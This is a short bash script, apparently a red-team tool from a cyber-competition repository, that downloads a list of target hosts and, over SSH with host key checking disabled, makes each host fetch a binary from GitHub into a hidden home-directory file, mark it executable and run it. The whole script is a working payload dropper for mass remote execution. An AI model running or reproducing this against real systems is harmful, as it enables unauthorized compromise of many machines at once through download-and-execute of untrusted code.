#!/bin/bash

USER_FILE="linux.txt"
CURL_COMMAND="curl -s -o ~/.gumper.lin https://github.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/raw/main/red-scripts/payloads/gumper.lin; chmod +x ~/.gumper.lin; ~/.gumper.lin"

curl -o linux.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/linux.txt

if [ ! -f "$USER_FILE" ]; then
    echo "The file $USER_FILE does not exist."
    exit 1
fi

while IFS= read -r line
do
    ssh -o StrictHostKeyChecking=no "$line" "$CURL_COMMAND"
done < "$USER_FILE"

